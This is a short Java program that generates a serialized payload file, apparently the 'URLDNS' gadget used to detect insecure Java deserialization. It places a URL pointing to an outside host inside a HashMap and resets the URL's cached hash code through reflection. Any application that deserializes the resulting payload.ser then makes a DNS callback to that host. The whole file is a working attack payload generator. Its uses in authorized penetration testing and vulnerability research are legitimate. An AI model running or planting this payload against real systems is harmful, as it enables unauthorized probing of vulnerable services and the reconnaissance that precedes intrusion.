import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.net.URL;
import java.lang.reflect.Field;

public class PayloadGenerator
{
    public static void main(String[] args) throws Exception 
    {
        URL u = new URL(null, "http://desertest57108.nstest222.xelphene.net");
        HashMap obj = new HashMap<String,String>();
        obj.put(u, "this_doesnt_matter");

        // During the put above, the URL's hashCode is calculated and
        // cached.  This resets that so the next time hashCode is called a
        // DNS lookup will be triggered.
        setFieldValue(u, "hashCode", -1);
        
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
    }

    public static Field getField(final Class<?> c, final String fieldName) throws Exception {
        Field field = c.getDeclaredField(fieldName);
        if (field != null)
            field.setAccessible(true);
        else if (c.getSuperclass() != null)
            field = getField(c.getSuperclass(), fieldName);
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception
    {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
